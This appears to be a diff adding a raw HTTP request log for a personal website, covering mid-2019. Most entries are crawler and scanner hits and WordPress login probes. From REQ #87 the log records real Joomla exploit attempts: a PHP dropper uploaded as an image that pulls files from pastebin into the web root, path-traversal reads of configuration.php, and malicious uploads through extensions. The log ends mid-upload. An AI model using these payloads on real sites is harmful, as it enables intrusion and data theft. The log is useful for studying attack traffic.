+  "te": "deflate,gzip;q=0.3",
+  "keep-alive": "300",
+  "connection": "Keep-Alive, TE",
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (Windows; U; Windows NT 2.0) Gecko/20091201 Firefox/3.5.6 GTB5"
+}
+::ffff:82.102.27.75
+{}
+{}
+**END SECURE REQUEST
+========= REQ #55==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:06:29:18:34:25
+HEAD
+{
+  "host": "github.davidthats.me",
+  "referer": "https://www.netcraft.com/survey/",
+  "user-agent": "Mozilla/4.0 (compatible; Netcraft Web Server Survey)",
+  "connection": "close"
+}
+::ffff:159.89.190.225
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #56==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:06:29:18:49:03
+GET
+{
+  "host": "github.davidthats.me",
+  "referer": "https://www.netcraft.com/survey/",
+  "user-agent": "Mozilla/4.0 (compatible; Netcraft Web Server Survey)",
+  "connection": "close"
+}
+::ffff:159.89.190.225
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #57==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:06:29:18:58:31
+GET
+{
+  "host": "github.davidthats.me",
+  "referer": "https://www.netcraft.com/survey/",
+  "user-agent": "Mozilla/4.0 (compatible; Netcraft Web Server Survey)",
+  "connection": "close"
+}
+::ffff:159.89.190.225
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #58==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/index.htm
+2019:06:29:19:07:36
+GET
+{
+  "host": "github.davidthats.me",
+  "referer": "https://www.netcraft.com/survey/",
+  "user-agent": "Mozilla/4.0 (compatible; Netcraft Web Server Survey)",
+  "connection": "close"
+}
+::ffff:159.89.190.225
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #59==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:07:01:16:46:31
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "JOZP 662839147992902935 917451489466696944 508187515517436352 138385832858002136 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #60==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:07:01:16:46:32
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "18JK4LX2CW1A3JBFY 937030846719628306 386187274903155780 397958379305561809 282061618992755495 874920072014698261 961695838325770793 932933235901829211 209860757809375794 532898000016952704 956480990857765175 991662004146033082 83103261452255680 2391516931205775 730435870601771066 56623962333618507 925817322337595490 213345832800207771 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #61==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:07:03:16:38:29
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)"
+}
+::ffff:167.71.178.224
+{}
+{}
+**END SECURE REQUEST
+========= REQ #62==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:07:04:14:26:08
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)"
+}
+::ffff:104.248.2.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #63==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:07:04:22:03:20
+GET
+{
+  "host": "github.davidthats.me",
+  "accept-charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
+  "user-agent": "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)",
+  "accept-encoding": "identity",
+  "accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
+  "accept-language": "en-gb,en;q=0.5",
+  "connection": "close"
+}
+::ffff:167.71.182.31
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #64==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:07:04:22:03:27
+GET
+{
+  "host": "github.davidthats.me",
+  "accept-charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
+  "user-agent": "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)",
+  "accept-encoding": "identity",
+  "accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
+  "accept-language": "en-gb,en;q=0.5",
+  "connection": "close"
+}
+::ffff:167.71.182.31
+{}
+{}
+**END SECURE REQUEST
+========= REQ #65==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/wp-login.php
+2019:07:08:11:05:07
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0",
+  "accept-encoding": "gzip",
+  "connection": "close"
+}
+::ffff:94.23.90.96
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #66==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/wp-login.php
+2019:07:08:11:05:08
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0",
+  "referer": "http://github.davidthats.me/wp-login.php",
+  "accept-encoding": "gzip",
+  "connection": "close"
+}
+::ffff:94.23.90.96
+{}
+{}
+**END SECURE REQUEST
+========= REQ #67==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:07:10:02:14:43
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "5MD01H 670431016913131065 922595026864390615 690215353245202431 348191255884294342 493221846499861387 96131871755327451 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #68==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:07:10:02:14:44
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "F 854530322320826368 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #69==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:07:13:21:30:17
+GET
+{
+  "host": "github.davidthats.me",
+  "keep-alive": "300",
+  "connection": "keep-alive",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+}
+::ffff:46.105.102.218
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #70==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/wp-login.php
+2019:07:16:19:10:31
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0",
+  "accept-encoding": "gzip",
+  "connection": "close"
+}
+::ffff:217.182.6.180
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #71==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/wp-login.php
+2019:07:16:19:10:31
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0",
+  "referer": "http://github.davidthats.me/wp-login.php",
+  "accept-encoding": "gzip",
+  "connection": "close"
+}
+::ffff:217.182.6.180
+{}
+{}
+**END SECURE REQUEST
+========= REQ #72==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:07:18:06:40:07
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "X7SIMTWABYQ44 10831319137980499 461057635524483708 889398654807305001 898770391977673964 170023795240965507 57091589580415435 454189221359264836 906600904731873756 588963445780637429 281754482211901043 361495063047091917 308668640244904594 688140304439038818 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #73==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:07:18:06:40:08
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "UX 135435899603542801 444075832038923821 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #74==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:07:19:01:36:09
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
+}
+::ffff:209.17.96.18
+{}
+{}
+**END SECURE REQUEST
+========= REQ #75==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:07:24:13:03:07
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
+}
+::ffff:209.17.97.18
+{}
+{}
+**END SECURE REQUEST
+========= REQ #76==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:07:26:16:28:10
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "N46FXND6C 275031184996870395 641457472717306365 80685368537832992 568377939220731853 880357546200185060 110528591173913085 384324365243787769 565112899956748679 493164722010998221 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #77==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:07:26:16:28:11
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "6AR1P3CM9PLQP7JNI4 307586248528569833 713886812607790533 591551205312102988 995359727530837821 886064232996666178 169600015482511769 120807990412277881 736225105495780907 711782656460105620 545656827776732488 541398682252427216 493519562042925727 798576725386172604 594761810188452631 45506371612505137 982974544323299619 666053980399111681 820577780915190820 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #78==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:07:27:01:18:13
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "upgrade-insecure-requests": "1",
+  "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+  "accept-encoding": "gzip, deflate, br",
+  "accept-language": "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7"
+}
+::ffff:108.255.194.121
+{}
+{}
+**END SECURE REQUEST
+========= REQ #79==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:07:27:06:31:44
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
+}
+::ffff:209.17.96.210
+{}
+{}
+**END SECURE REQUEST
+========= REQ #80==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me//wp-login.php
+2019:07:30:13:18:12
+GET
+{
+  "host": "github.davidthats.me",
+  "accept-encoding": "gzip, deflate",
+  "accept": "*/*",
+  "user-agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",
+  "x-forwarded-for": "198.188.111.96",
+  "referer": "http://www.google.com.hk"
+}
+::ffff:77.38.64.116
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #81==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:07:30:14:02:25
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
+}
+::ffff:209.17.97.58
+{}
+{}
+**END SECURE REQUEST
+========= REQ #82==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/admin/images/cal_date_over.gif
+2019:08:01:11:54:02
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #83==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/admin/
+2019:08:01:11:54:11
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #84==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/templates/system/css/system.css
+2019:08:01:11:54:17
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #85==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:01:11:54:29
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #86==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/language/en-GB/en-GB.xml
+2019:08:01:11:54:37
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #87==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/index.php?option=com_adsmanager&task=upload&tmpl=component
+2019:08:01:11:54:44
+POST
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5",
+  "content-length": "1159"
+}
+::ffff:46.105.99.212
+{}
+{"--d3c84fbca8c0cf69bdf25d28c530e7da\r\nContent-Disposition: form-data; name":"\"name\"\r\n\r\nvuln.php\r\n--d3c84fbca8c0cf69bdf25d28c530e7da\r\nContent-Disposition: form-data; name=\"file\"; filename=\"index.jpg\"\r\n\r\n<title>Vuln!! patch it Now!</title>\r\n<?php\r\nfunction http_get($url){\r\n\t$im = curl_init($url);\r\n\tcurl_setopt($im, CURLOPT_RETURNTRANSFER, 1);\r\n\tcurl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);\r\n\tcurl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);\r\n\tcurl_setopt($im, CURLOPT_HEADER, 0);\r\n\treturn curl_exec($im);\r\n\tcurl_close($im);\r\n}\r\n$check = $_SERVER['DOCUMENT_ROOT'] . \"/images/vuln.php\" ;\r\n$text = http_get('https://pastebin.com/raw/phAM8DFH');\r\n$open = fopen($check, 'w');\r\nfwrite($open, $text);\r\nfclose($open);\r\nif(file_exists($check)){\r\n    echo $check.\"</br>\";\r\n}else \r\n  echo \"not exits\";\r\necho \"done .\\n \" ;\r\n\r\n$check2 = $_SERVER['DOCUMENT_ROOT'] . \"/vuln.htm\" ;\r\n$text2 = http_get('https://pastebin.com/raw/880ufaWF');\r\n$open2 = fopen($check2, 'w');\r\nfwrite($open2, $text2);\r\nfclose($open2);\r\nif(file_exists($check2)){\r\n    echo $check2.\"</br>\";\r\n}else \r\n  echo \"not exits\";\r\necho \"done .\\n \" ;\r\n\r\n@unlink(__FILE__);\r\n?>\r\n\r\n--d3c84fbca8c0cf69bdf25d28c530e7da--\r\n"}
+**END SECURE REQUEST
+========= REQ #88==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/administrator/components/com_alberghi/upload.alberghi.php
+2019:08:01:11:54:53
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #89==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/index.php?option=com_cckjseblod&task=download&file=configuration.php
+2019:08:01:11:55:02
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #90==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=
+2019:08:01:11:55:15
+POST
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5",
+  "content-length": "1235"
+}
+::ffff:46.105.99.212
+{}
+{"--974dd7ba3dede93d45326d0a1c1d694b\r\nContent-Disposition: form-data; name":"\"option\"\r\n\r\ncom_fabrik\r\n--974dd7ba3dede93d45326d0a1c1d694b\r\nContent-Disposition: form-data; name=\"field_delimiter\"\r\n\r\n,\r\n--974dd7ba3dede93d45326d0a1c1d694b\r\nContent-Disposition: form-data; name=\"text_delimiter\"\r\n\r\n","quot;\r\n--974dd7ba3dede93d45326d0a1c1d694b\r\nContent-Disposition: form-data; name":"\"controller\"\r\n\r\nimport\r\n--974dd7ba3dede93d45326d0a1c1d694b\r\nContent-Disposition: form-data; name=\"tableid\"\r\n\r\n0\r\n--974dd7ba3dede93d45326d0a1c1d694b\r\nContent-Disposition: form-data; name=\"overwrite\"\r\n\r\n1\r\n--974dd7ba3dede93d45326d0a1c1d694b\r\nContent-Disposition: form-data; name=\"Itemid\"\r\n\r\n0\r\n--974dd7ba3dede93d45326d0a1c1d694b\r\nContent-Disposition: form-data; name=\"task\"\r\n\r\ndoimport\r\n--974dd7ba3dede93d45326d0a1c1d694b\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nme.php\r\n--974dd7ba3dede93d45326d0a1c1d694b\r\nContent-Disposition: form-data; name=\"drop_data\"\r\n\r\n1\r\n--974dd7ba3dede93d45326d0a1c1d694b\r\nContent-Disposition: form-data; name=\"view\"\r\n\r\nimport\r\n--974dd7ba3dede93d45326d0a1c1d694b\r\nContent-Disposition: form-data; name=\"userfile\"; filename=\"files/vuln.txt\"\r\nContent-Type: multipart/form-data\r\n\r\nVuln!! patch it Now!\r\n--974dd7ba3dede93d45326d0a1c1d694b--\r\n"}
+**END SECURE REQUEST
+========= REQ #91==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/media/vuln.txt
+2019:08:01:11:55:21
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #92==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php
+2019:08:01:11:55:30
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #93==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/index.php?option=com_jdownloads&Itemid=0&view=upload
+2019:08:01:11:55:37
+POST
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5",
+  "content-length": "4711"
+}
+::ffff:46.105.99.212
+{}
+{"0":"","--7cf1b0f04de3ac17609a925c133c24f5\r\nContent-Disposition: form-data; name":"\"catlist\"\r\n\r\n1\r\n--7cf1b0f04de3ac17609a925c133c24f5\r\nContent-Disposition: form-data; name=\"view\"\r\n\r\nupload\r\n--7cf1b0f04de3ac17609a925c133c24f5\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nur name\r\n--7cf1b0f04de3ac17609a925c133c24f5\r\nContent-Disposition: form-data; name=\"option\"\r\n\r\ncom_jdownloads\r\n--7cf1b0f04de3ac17609a925c133c24f5\r\nContent-Disposition: form-data; name=\"filetitle\"\r\n\r\nlolz\r\n--7cf1b0f04de3ac17609a925c133c24f5\r\nContent-Disposition: form-data; name=\"mail\"\r\n\r\nTTTntsfT@aa.com\r\n--7cf1b0f04de3ac17609a925c133c24f5\r\nContent-Disposition: form-data; name=\"send\"\r\n\r\n1\r\n--7cf1b0f04de3ac17609a925c133c24f5\r\nContent-Disposition: form-data; name=\"senden\"\r\n\r\nSend file\r\n--7cf1b0f04de3ac17609a925c133c24f5\r\nContent-Disposition: form-data; name=\"2d1a8f3bd0b5cf542e9312d74fc9766f\"\r\n\r\n1\r\n--7cf1b0f04de3ac17609a925c133c24f5\r\nContent-Disposition: form-data; name=\"description\"\r\n\r\n<p>qsdqsdqsdqsdqsdqsdqsd</p>\r\n--7cf1b0f04de3ac17609a925c133c24f5\r\nContent-Disposition: form-data; name=\"file_upload\"; filename=\"files/jdownlods.zip\"\r\nContent-Type: multipart/form-data\r\n\r\nPK\u0003\u0004\u0014\u0000\u0000\u0000\b\u0000H�lL�\u0015.\u0004\u0002\t\u0000\u0000�\t\u0000\u0000\u0007\u0000\u0000\u0000pwn.gifMR{\\��\u0016^M��n'��q�%���E��߮�Ω�瞔z��\nS�\u0019_e4E�t{���\u001d�\u0014J��Д����\u001bjB�0bb��8�;����k���~k��y������ s\u001dw�\u0002���\b\u001d���-\f����M\u0000\u0001`\u0000\u0002@\u0001\u0018p\u0000\u001c\u0002\u000e\u0003G���1�\u0001x\u0004<\u0006�\u0000O�g \u0000\b\b\u0004\f\u0002\u0001���@\u0004\u0010\u0011�\u0018D\u0002\"\u0005��\u0004 !�0H\u0004$\n\u0012\u001b�\r\f\u0001��\b0\n�!�n�\u0000# \b�0�8@\u001cB\u001cF\u001cA\u001cE\u001cC< \u001e!\u001e#� �\"�!\u0001�����@�@���\bHDH�H$H�HdH\u0002$!$a$\u0011$Q$1�\u00001�\u0018F� F\u0011cXK\u001ba�\u0018\b\u0006:|\u0016�\u0000s\bs\u0018s\u0004s\u0014s\f�y�y�y�y�y�\u0005�\u0002�\u0002�\u0002�\u0002�\u0002�\"`\u0011a\u0011c�`�b�a\t�����D�D��0\u0003�\u0010f\u00183�\u0019Ō\u0011��\u0000","@\b�aE\b\u0007�C�Ä#���c�\u0007�#�c�\u0013�S�3\"\u0000\u0011\u0010\u00110\u0011\b\u0011(\u0011\u0018\u0011�����������H@$D$L$B$J$F\u0018\u0010�\bÄ\u0011�(a�j�F\u00140\u0005B�\u000e�A9�\u001c�\u001c�\u001c�\u001c�\u001c�<P\u001eQ\u001eS�P�R�Q\u0001�����@�@���\bTDT�T$T�TdT\u0002*!*a*\u0011*Q*1ʀ2D\u0019��PF)c�G\u0000��\u0004�\u0016\u001c~\u0005\u000e\u0018�\u0018�\u0019G\u0018G\u0019�\u0018\u000f�G�ǌ'���gL\u0000":""," 